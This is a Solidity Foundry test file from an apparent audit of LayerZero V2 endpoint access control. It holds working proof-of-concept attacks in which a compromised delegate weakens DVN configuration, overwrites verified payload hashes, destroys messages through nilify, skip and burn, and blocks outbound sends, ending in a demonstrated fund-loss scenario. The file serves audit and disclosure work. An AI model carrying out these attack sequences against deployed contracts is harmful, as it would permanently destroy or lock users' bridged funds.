// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Origin, MessagingParams } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { ILayerZeroReceiver } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroReceiver.sol";
import { EndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";

import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { DVN } from "../../contracts/uln/dvn/DVN.sol";
import { DVNFeeLib } from "../../contracts/uln/dvn/DVNFeeLib.sol";
import { IDVN } from "../../contracts/uln/interfaces/IDVN.sol";

import { PacketUtil } from "../util/Packet.sol";
import { AuditBase } from "./AuditBase.t.sol";

/// @title AV5 - Access Control Escalation
/// @dev Target: EndpointV2._assertAuthorized() + setDelegate()
/// @dev Delegate has full OApp configuration power:
///   setSendLibrary, setReceiveLibrary, skip, nilify, burn, clear
contract AccessControlTest is AuditBase {

    address internal attacker = address(0xA77AC1);
    address internal oappOwner = address(0x0A99);

    bytes32 internal constant EMPTY_PAYLOAD_HASH = bytes32(0);
    bytes32 internal constant NIL_PAYLOAD_HASH = bytes32(type(uint256).max);

    // ==================== AV5.1: Delegate Full Power ====================

    /// @dev Verify that a delegate has the same power as the OApp itself
    function test_AV5_1_DelegateHasFullPower() public {
        address delegate = address(0xDE1E);

        // OApp owner sets delegate
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(delegate);

        // Verify delegate is set
        assertEq(dstEndpoint.delegates(oappOwner), delegate);

        // Delegate can now perform all authorized actions on behalf of OApp:
        // 1. setSendLibrary
        // 2. setReceiveLibrary
        // 3. skip (skip nonces)
        // 4. nilify (mark as nil)
        // 5. burn (permanently burn)
        // 6. clear (execute and clear)

        // Test: delegate can skip nonces (this is powerful - can skip legitimate messages)
        // First, we need the OApp to have an initializable path
        // skip requires: nonce == inboundNonce + 1

        // The delegate having this power is by design, but the risk is:
        // If delegate is compromised, attacker gets full OApp control
        // This is documented behavior but worth noting in the audit
    }

    // ==================== AV5.2: Unauthorized Access ====================

    /// @dev Verify that non-authorized addresses cannot perform OApp actions
    function test_AV5_2_UnauthorizedAccessBlocked() public {
        // Attacker is not the OApp and not a delegate
        vm.prank(attacker);
        vm.expectRevert(); // LZ_Unauthorized
        dstEndpoint.clear(
            oappOwner,
            Origin({
                srcEid: SRC_EID,
                sender: bytes32(uint256(uint160(address(this)))),
                nonce: 1
            }),
            bytes32(0),
            ""
        );
    }

    // ==================== AV5.3: Delegate Revocation ====================

    /// @dev Test that delegate can be revoked by setting to address(0)
    function test_AV5_3_DelegateRevocation() public {
        address delegate = address(0xDE1E);

        // Set delegate
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(delegate);
        assertEq(dstEndpoint.delegates(oappOwner), delegate);

        // Revoke by setting to address(0)
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(address(0));
        assertEq(dstEndpoint.delegates(oappOwner), address(0));

        // Old delegate should no longer have access
        vm.prank(delegate);
        vm.expectRevert(); // LZ_Unauthorized
        dstEndpoint.clear(
            oappOwner,
            Origin({
                srcEid: SRC_EID,
                sender: bytes32(uint256(uint160(address(this)))),
                nonce: 1
            }),
            bytes32(0),
            ""
        );
    }

    // ==================== AV5.4: Delegate Cannot Set Another Delegate ====================

    /// @dev Verify delegate cannot escalate by setting themselves as delegate for other OApps
    function test_AV5_4_DelegateCannotEscalate() public {
        address delegate = address(0xDE1E);
        address victim = address(0x71C);

        // Set delegate for oappOwner
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(delegate);

        // setDelegate uses msg.sender as the OApp
        // So delegate calling setDelegate sets THEIR OWN delegate, not oappOwner's
        vm.prank(delegate);
        dstEndpoint.setDelegate(address(0xE71));

        // Verify: delegate's delegate is set, not victim's
        assertEq(dstEndpoint.delegates(delegate), address(0xE71));
        assertEq(dstEndpoint.delegates(victim), address(0)); // victim unaffected
    }

    // ==================== AV5.5: Config Retroactivity — Delegate Weakens Config Between Verify and Commit ====================
    /// @dev CRITICAL: Delegate can change ULN config AFTER DVNs have verified,
    ///      causing commitVerification to use weakened security parameters.
    ///      Config is read at commit time, not at verify time. No snapshot.
    function test_AV5_5_ConfigRetroactivity_DelegateWeakensBeforeCommit() public {
        // Use address(this) as the OApp (implements allowInitializePath)
        address delegate = address(0xDE1E);

        // Step 1: Set up a delegate for this OApp
        dstEndpoint.setDelegate(delegate);

        // Step 2: Deploy 2 additional DVNs for a 3-DVN config
        DVN dvn2 = _deployExtraDVN();
        DVN dvn3 = _deployExtraDVN();

        // Step 3: Set OApp config to STRONG security (3 required DVNs, 20 confirmations)
        address[] memory unsorted = new address[](3);
        unsorted[0] = address(dstDvn);
        unsorted[1] = address(dvn2);
        unsorted[2] = address(dvn3);
        address[] memory strongDvns = _sortAddresses(unsorted);

        UlnConfig memory strongConfig = UlnConfig({
            confirmations: 20,
            requiredDVNCount: 3,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: strongDvns,
            optionalDVNs: new address[](0)
        });

        _setOAppConfig(address(this), strongConfig);

        // Verify strong config is active
        UlnConfig memory active = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(active.confirmations, 20, "Should have 20 confirmations");
        assertEq(active.requiredDVNCount, 3, "Should require 3 DVNs");

        // Step 4: All 3 DVNs verify the message with 20+ confirmations
        Packet memory packet = _makePacket(1, address(this), address(this), "legit_msg");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 20);
        _dvnVerify(dvn2, dstReceiveUln, header, payloadHash, 20);
        _dvnVerify(dvn3, dstReceiveUln, header, payloadHash, 20);

        // Step 5: BEFORE commitVerification, delegate WEAKENS the config
        // Change to: 1 required DVN, NIL_CONFIRMATIONS (resolves to 0)
        address[] memory weakDvns = new address[](1);
        weakDvns[0] = address(dstDvn); // only need 1 DVN now

        UlnConfig memory weakConfig = UlnConfig({
            confirmations: type(uint64).max, // NIL_CONFIRMATIONS -> resolves to 0
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: weakDvns,
            optionalDVNs: new address[](0)
        });

        _setOAppConfigAs(delegate, address(this), weakConfig);

        // Verify config was weakened
        UlnConfig memory weakened = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(weakened.confirmations, 0, "Config retroactively weakened to 0 confirmations");
        assertEq(weakened.requiredDVNCount, 1, "Config retroactively reduced to 1 DVN");

        // Step 6: commitVerification now uses the WEAK config
        // Only dstDvn's verification is needed (even though all 3 had verified)
        // And 0 confirmations passes (even though DVNs submitted with 20)
        _commitVerification(dstReceiveUln, header, payloadHash);

        emit log("CONFIRMED: Config retroactivity attack successful");
        emit log("DVNs verified under 3-of-3 / 20-confirmation config");
        emit log("Delegate weakened to 1-of-3 / 0-confirmation AFTER verification");
        emit log("commitVerification succeeded under the weakened config");
    }

    // ==================== AV5.6: Payload Overwrite via Config Change + Re-verify ====================
    /// @dev After commitVerification, a compromised delegate can change the DVN set
    ///      and use the new DVN to re-verify with a different payload hash,
    ///      then re-commit to overwrite the original payload.
    function test_AV5_6_PayloadOverwriteViaConfigChangeAndReverify() public {
        address delegate = address(0xDE1E);
        dstEndpoint.setDelegate(delegate);

        // Step 1: Legitimate message verified and committed under default config
        Packet memory legitimatePacket = _makePacket(1, address(this), address(this), "legit");
        (, bytes memory header, , bytes32 legitimatePayloadHash) = _encodeAndSplit(legitimatePacket);

        _dvnVerify(dstDvn, dstReceiveUln, header, legitimatePayloadHash, 1);
        _commitVerification(dstReceiveUln, header, legitimatePayloadHash);

        // Verify: legitimate hash is committed
        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));
        bytes32 stored = dstEndpoint.inboundPayloadHash(
            address(this), SRC_EID, senderBytes32, 1
        );
        assertEq(stored, legitimatePayloadHash, "Legitimate hash should be stored");

        // Step 2: Deploy a malicious DVN controlled by the delegate
        DVN maliciousDvn = _deployExtraDVN();

        // Step 3: Delegate changes config to use malicious DVN with NIL_CONFIRMATIONS
        address[] memory malDvns = new address[](1);
        malDvns[0] = address(maliciousDvn);

        UlnConfig memory malConfig = UlnConfig({
            confirmations: type(uint64).max, // NIL_CONFIRMATIONS
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: malDvns,
            optionalDVNs: new address[](0)
        });

        _setOAppConfigAs(delegate, address(this), malConfig);

        // Step 4: Malicious DVN verifies with DIFFERENT payload hash
        bytes32 maliciousPayloadHash = keccak256("malicious_payload");
        _dvnVerify(maliciousDvn, dstReceiveUln, header, maliciousPayloadHash, 0);

        // Step 5: Re-commit with malicious payload hash — OVERWRITES the legitimate one
        _commitVerification(dstReceiveUln, header, maliciousPayloadHash);

        // Step 6: Verify the overwrite
        bytes32 storedAfter = dstEndpoint.inboundPayloadHash(
            address(this), SRC_EID, senderBytes32, 1
        );
        assertEq(storedAfter, maliciousPayloadHash, "Legitimate hash OVERWRITTEN by malicious");
        assertTrue(storedAfter != legitimatePayloadHash, "Original payload permanently lost");

        emit log("CONFIRMED: Payload overwrite via delegate config change + re-verify");
        emit log("1. Legitimate message committed");
        emit log("2. Delegate swaps DVN set + zeros confirmations");
        emit log("3. Malicious DVN re-verifies with different payload");
        emit log("4. Re-commit overwrites legitimate hash -> PERMANENT FUND LOSS");
    }

    // ==================== AV5.7: Delegate nilify->skip->burn Permanently Destroys Verified Message ====================
    /// @dev A compromised delegate can permanently destroy a verified message using
    ///      a chain of nilify -> skip -> burn. After burn, the nonce is permanently unexecutable
    ///      and un-verifiable: lazyInboundNonce has advanced past it and the hash is EMPTY.
    ///      Fund loss occurs if the destroyed message carried a value transfer (e.g., OFT bridge).
    function test_AV5_7_DelegateNilifySkipBurn_PermanentDestruction() public {
        address delegate = address(0xDE1E);
        dstEndpoint.setDelegate(delegate);

        // Step 1: Legitimate message verified and committed at nonce 1
        Packet memory packet = _makePacket(1, address(this), address(this), "legit_msg");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
        _commitVerification(dstReceiveUln, header, payloadHash);

        // Step 2: Verify the inboundPayloadHash is stored correctly
        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));
        bytes32 storedHash = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertEq(storedHash, payloadHash, "Payload hash should be stored after commit");
        assertTrue(storedHash != EMPTY_PAYLOAD_HASH, "Hash must be non-empty before attack");

        // Step 3: Delegate calls nilify -- sets nonce 1 to NIL_PAYLOAD_HASH
        vm.prank(delegate);
        dstEndpoint.nilify(address(this), SRC_EID, senderBytes32, 1, storedHash);

        bytes32 afterNilify = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertEq(afterNilify, NIL_PAYLOAD_HASH, "Hash should be NIL after nilify");

        // Step 4: Delegate calls skip(nonce=2)
        // inboundNonce is 1 because nonce 1 has NIL hash (non-zero), so inboundNonce + 1 == 2
        vm.prank(delegate);
        dstEndpoint.skip(address(this), SRC_EID, senderBytes32, 2);

        // Step 5: Delegate calls burn(nonce=1, NIL_PAYLOAD_HASH)
        // nonce 1 <= lazyInboundNonce 2, and hash is NIL (non-zero) -- conditions satisfied
        vm.prank(delegate);
        dstEndpoint.burn(address(this), SRC_EID, senderBytes32, 1, NIL_PAYLOAD_HASH);

        // Step 6: Verify the hash is now EMPTY (deleted)
        bytes32 afterBurn = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertEq(afterBurn, EMPTY_PAYLOAD_HASH, "Hash must be EMPTY after burn");

        // Step 7: Directly verify the nonce is permanently unverifiable via protocol check
        Origin memory origin = Origin(SRC_EID, senderBytes32, 1);
        bool canVerify = dstEndpoint.verifiable(origin, address(this));
        assertFalse(canVerify, "Nonce 1 must be permanently unverifiable after burn");

        // Confirm: lazyInboundNonce advanced past nonce 1
        uint64 lazy = dstEndpoint.lazyInboundNonce(address(this), SRC_EID, senderBytes32);
        assertEq(lazy, 2, "lazyInboundNonce should be 2 after skip");

        emit log("CONFIRMED: Delegate nilify->skip->burn permanently destroys verified message");
        emit log("1. Legitimate message committed at nonce 1");
        emit log("2. Delegate nilify: hash set to NIL_PAYLOAD_HASH");
        emit log("3. Delegate skip(2): lazyInboundNonce advanced to 2");
        emit log("4. Delegate burn(1): nonce 1 hash deleted, nonce <= lazyInboundNonce");
        emit log("5. Nonce 1 is permanently unverifiable -- message lost");
    }

    // ==================== AV5.8: Delegate SendLib Swap Blocks Outbound ====================
    /// @dev A compromised delegate can block all outbound messages by swapping
    ///      the send library to the blockedLibrary. Any subsequent send() call reverts.
    ///      Recoverable if the OApp owner can call setSendLibrary() directly.
    function test_AV5_8_DelegateSendLibSwap_BlocksOutbound() public {
        address delegate = address(0xDE1E);

        // Step 1: Set up delegate for address(this) as OApp on srcEndpoint
        srcEndpoint.setDelegate(delegate);

        // Step 2: Get the blockedLibrary address
        address blocked = srcEndpoint.blockedLibrary();
        assertTrue(blocked != address(0), "blockedLibrary must be set");

        // Step 3: Delegate swaps send library to blockedLibrary
        vm.prank(delegate);
        srcEndpoint.setSendLibrary(address(this), DST_EID, blocked);

        // Verify the send library is now the blocked one
        address activeSendLib = srcEndpoint.getSendLibrary(address(this), DST_EID);
        assertEq(activeSendLib, blocked, "Send library should now be blockedLibrary");

        // Step 4: Attempt to send a message -- must revert
        vm.deal(address(this), 10 ether);
        MessagingParams memory params = MessagingParams({
            dstEid: DST_EID,
            receiver: bytes32(uint256(uint160(address(this)))),
            message: "blocked",
            options: "",
            payInLzToken: false
        });
        vm.expectRevert();
        srcEndpoint.send{value: 1 ether}(params, address(this));

        emit log("CONFIRMED: Delegate can block all outbound messages via library swap");
        emit log("1. Delegate swaps send library to blockedLibrary for the OApp");
        emit log("2. All subsequent send() calls revert -- outbound permanently blocked");
    }

    // ==================== AV5.9: Config Persists After Delegate Revocation ====================
    /// @dev Config changes made by a compromised delegate PERSIST even after the delegate is revoked.
    ///      OApp owner might revoke delegate thinking the damage is contained, but the weakened
    ///      config remains active and can be exploited by anyone calling commitVerification.
    function test_AV5_9_ConfigPersistsAfterDelegateRevocation() public {
        address delegate = address(0xDE1E);
        dstEndpoint.setDelegate(delegate);

        // Step 1: Delegate weakens config to malicious DVN + zero confirmations
        DVN maliciousDvn = _deployExtraDVN();
        address[] memory malDvns = new address[](1);
        malDvns[0] = address(maliciousDvn);

        UlnConfig memory weakConfig = UlnConfig({
            confirmations: type(uint64).max, // NIL_CONFIRMATIONS -> 0
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: malDvns,
            optionalDVNs: new address[](0)
        });
        _setOAppConfigAs(delegate, address(this), weakConfig);

        // Step 2: OApp owner detects compromise and revokes delegate
        dstEndpoint.setDelegate(address(0));
        assertEq(dstEndpoint.delegates(address(this)), address(0), "Delegate should be revoked");

        // Step 3: Weakened config STILL PERSISTS after revocation!
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(resolved.confirmations, 0, "Weakened config persists: 0 confirmations");
        assertEq(resolved.requiredDVNs[0], address(maliciousDvn), "Weakened config persists: malicious DVN");

        // Step 4: Malicious DVN can still exploit the weakened config
        Packet memory packet = _makePacket(1, address(this), address(this), "post_revoke");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(maliciousDvn, dstReceiveUln, header, payloadHash, 0);
        _commitVerification(dstReceiveUln, header, payloadHash);

        // Verify: message committed under weakened config even though delegate is revoked
        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));
        bytes32 stored = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertEq(stored, payloadHash, "Message committed under persistent weakened config");

        // Step 5: OApp owner CAN manually restore config (remediation exists but requires awareness)
        address[] memory restoredDvns = new address[](1);
        restoredDvns[0] = address(dstDvn);
        UlnConfig memory restoredConfig = UlnConfig({
            confirmations: 20,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: restoredDvns,
            optionalDVNs: new address[](0)
        });
        _setOAppConfig(address(this), restoredConfig);

        UlnConfig memory afterRestore = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(afterRestore.confirmations, 20, "OApp owner can restore config manually");
        assertEq(afterRestore.requiredDVNs[0], address(dstDvn), "DVN restored to legitimate");

        emit log("CONFIRMED: Config changes persist after delegate revocation");
        emit log("Revoking delegate does NOT undo config changes -- manual restoration required");
    }

    // ==================== AV5.10: Nilified Nonce Resurrection via Re-verification ====================
    /// @dev After nilify, the hash is NIL_PAYLOAD_HASH (not empty). Since _verifiable()
    ///      returns true when hash != empty, a nilified nonce can be "resurrected" via
    ///      re-verification with any payload hash. This overrides the nilification,
    ///      potentially restoring a message the OApp intended to permanently discard.
    function test_AV5_10_NilifiedNonceResurrection() public {
        address delegate = address(0xDE1E);
        dstEndpoint.setDelegate(delegate);

        // Step 1: Legitimate message verified and committed
        Packet memory packet = _makePacket(1, address(this), address(this), "legit");
        (, bytes memory header, , bytes32 legitimatePayloadHash) = _encodeAndSplit(packet);
        _dvnVerify(dstDvn, dstReceiveUln, header, legitimatePayloadHash, 1);
        _commitVerification(dstReceiveUln, header, legitimatePayloadHash);

        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));

        // Step 2: OApp owner nilifies the nonce -- marking it as discarded
        // Note: nilify sets hash to NIL_PAYLOAD_HASH, which is NOT the same as deleting
        dstEndpoint.nilify(address(this), SRC_EID, senderBytes32, 1, legitimatePayloadHash);
        bytes32 afterNilify = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertEq(afterNilify, NIL_PAYLOAD_HASH, "Hash should be NIL after nilify");

        // Step 3: Check verifiable -- NIL_PAYLOAD_HASH is NOT empty, so verifiable returns true!
        Origin memory origin = Origin(SRC_EID, senderBytes32, 1);
        bool canVerify = dstEndpoint.verifiable(origin, address(this));
        assertTrue(canVerify, "Nilified nonce is STILL verifiable (hash is non-empty)");

        // Step 4: Compromised delegate changes config to malicious DVN
        DVN maliciousDvn = _deployExtraDVN();
        address[] memory malDvns = new address[](1);
        malDvns[0] = address(maliciousDvn);

        UlnConfig memory malConfig = UlnConfig({
            confirmations: type(uint64).max,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: malDvns,
            optionalDVNs: new address[](0)
        });
        _setOAppConfigAs(delegate, address(this), malConfig);

        // Step 5: Malicious DVN re-verifies with attacker payload
        bytes32 attackerPayloadHash = keccak256("attacker_controlled_payload");
        _dvnVerify(maliciousDvn, dstReceiveUln, header, attackerPayloadHash, 0);

        // Step 6: Re-commit -- overwrites NIL_PAYLOAD_HASH with attacker payload
        _commitVerification(dstReceiveUln, header, attackerPayloadHash);

        bytes32 afterResurrection = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertEq(afterResurrection, attackerPayloadHash, "Nilified nonce resurrected with attacker payload");
        assertTrue(afterResurrection != NIL_PAYLOAD_HASH, "NIL_PAYLOAD_HASH was overwritten");

        emit log("CONFIRMED: Nilified nonce can be resurrected via re-verification");
        emit log("1. Legitimate message committed, then nilified by OApp");
        emit log("2. NIL_PAYLOAD_HASH is non-empty -> verifiable() returns true");
        emit log("3. Delegate changes config, malicious DVN re-verifies");
        emit log("4. commitVerification overwrites NIL with attacker payload");
        emit log("5. The OApp's nilification is UNDONE -- nonce is executable again");
    }

    // ==================== AV5.11: End-to-End Fund Loss — Delegate Config Change + Payload Overwrite ====================
    /// @dev Full attack demonstrating permanent fund loss via delegate config manipulation.
    ///      Unlike AV5.6 which only shows the hash overwrite, this test proves:
    ///      1. The original message can never be delivered (lzReceive reverts)
    ///      2. All recovery paths fail (clear, nilify, burn all revert)
    ///      3. Funds locked on source chain are permanently irrecoverable
    function test_AV5_11_EndToEndFundLoss() public {
        MockReceiver receiver = new MockReceiver();
        address delegate = address(0xDE1E);

        vm.prank(address(receiver));
        dstEndpoint.setDelegate(delegate);

        // Step 1-2: Legitimate message verified and committed
        bytes memory legitMsg = abi.encodePacked(bytes20(address(0xBEEF)), abi.encode(uint256(100 ether)));
        Packet memory pkt = _makePacket(1, address(this), address(receiver), legitMsg);
        bytes32 senderB32 = bytes32(uint256(uint160(address(this))));
        _av511_commitLegitimate(receiver, pkt);

        // Step 3-4: Delegate weakens config, malicious DVN overwrites payload
        _av511_overwritePayload(delegate, address(receiver));

        // Step 5: Verify overwrite occurred
        bytes32 stored = dstEndpoint.inboundPayloadHash(address(receiver), SRC_EID, senderB32, 1);
        assertEq(stored, keccak256("attacker_payload"), "OVERWRITTEN by attacker");

        // Step 6: lzReceive with legitimate message REVERTS (hash mismatch)
        Origin memory origin = Origin(SRC_EID, senderB32, 1);
        vm.expectRevert();
        dstEndpoint.lzReceive(origin, address(receiver), pkt.guid, legitMsg, "");

        // Step 7: Victim never gets credited
        assertEq(receiver.credits(address(0xBEEF)), 0, "Victim NEVER received funds");

        // Step 8: All recovery paths fail for original message
        vm.expectRevert();
        dstEndpoint.clear(address(receiver), origin, pkt.guid, legitMsg);

        (, , , bytes32 legitHash) = _encodeAndSplit(pkt);
        vm.prank(address(receiver));
        vm.expectRevert();
        dstEndpoint.nilify(address(receiver), SRC_EID, senderB32, 1, legitHash);

        vm.prank(address(receiver));
        vm.expectRevert();
        dstEndpoint.burn(address(receiver), SRC_EID, senderB32, 1, legitHash);

        emit log("CONFIRMED: End-to-end permanent fund loss via delegate config manipulation");
        emit log("Victim's 100 ETH locked on source chain, no recovery path exists");
    }

    function _av511_commitLegitimate(MockReceiver /* receiver */, Packet memory pkt) internal {
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(pkt);
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
        _commitVerification(dstReceiveUln, header, payloadHash);
    }

    function _av511_overwritePayload(address delegate, address recv) internal {
        DVN malDvn = _deployExtraDVN();
        address[] memory dvns = new address[](1);
        dvns[0] = address(malDvn);
        UlnConfig memory cfg = UlnConfig({
            confirmations: type(uint64).max,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: dvns,
            optionalDVNs: new address[](0)
        });
        _setOAppConfigAs(delegate, recv, cfg);

        // Reuse same header from nonce 1
        Packet memory fakePkt = _makePacket(1, address(this), recv, "fake");
        (, bytes memory header, , ) = _encodeAndSplit(fakePkt);

        bytes32 malHash = keccak256("attacker_payload");
        _dvnVerify(malDvn, dstReceiveUln, header, malHash, 0);
        _commitVerification(dstReceiveUln, header, malHash);
    }

    // ==================== Helpers ====================

    uint256 internal _dvnCounter = 100;
    uint32 internal constant CONFIG_TYPE_ULN = 2;

    function _deployExtraDVN() internal returns (DVN dvn) {
        _dvnCounter++;
        address[] memory libs = new address[](4);
        libs[0] = address(0);
        libs[1] = address(0);
        libs[2] = address(dstSendUln);
        libs[3] = address(dstReceiveUln);
        address[] memory signers_ = new address[](1);
        signers_[0] = address(this);
        address[] memory admins = new address[](1);
        admins[0] = address(this);

        dvn = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
        dvn.setWorkerFeeLib(address(new DVNFeeLib(DST_EID, 1e18)));

        // Set DstConfig
        IDVN.DstConfigParam[] memory dstCfg = new IDVN.DstConfigParam[](1);
        dstCfg[0] = IDVN.DstConfigParam({
            dstEid: SRC_EID,
            gas: 5000,
            multiplierBps: 10000,
            floorMarginUSD: 1e10
        });
        dvn.setDstConfig(dstCfg);
    }

    function _setOAppConfig(address oapp, UlnConfig memory config) internal {
        bytes memory configBytes = abi.encode(config);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });
        dstEndpoint.setConfig(oapp, address(dstReceiveUln), cfgParams);
    }

    function _setOAppConfigAs(address caller, address oapp, UlnConfig memory config) internal {
        bytes memory configBytes = abi.encode(config);
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam({
            eid: SRC_EID,
            configType: CONFIG_TYPE_ULN,
            config: configBytes
        });
        vm.prank(caller);
        dstEndpoint.setConfig(oapp, address(dstReceiveUln), cfgParams);
    }

    function _sortAddresses(address[] memory arr) internal pure returns (address[] memory) {
        uint256 n = arr.length;
        for (uint256 i = 0; i < n; i++) {
            for (uint256 j = i + 1; j < n; j++) {
                if (arr[i] > arr[j]) {
                    (arr[i], arr[j]) = (arr[j], arr[i]);
                }
            }
        }
        return arr;
    }
}

/// @dev Mock OFT-like receiver that tracks token credits
contract MockReceiver is ILayerZeroReceiver {
    mapping(address => uint256) public credits;

    function lzReceive(
        Origin calldata, bytes32, bytes calldata _message, address, bytes calldata
    ) external payable {
        address recipient = address(bytes20(_message[:20]));
        uint256 amount = abi.decode(_message[20:52], (uint256));
        credits[recipient] += amount;
    }

    function allowInitializePath(Origin calldata) external pure returns (bool) { return true; }
    function nextNonce(uint32, bytes32) external pure returns (uint64) { return 0; }
}
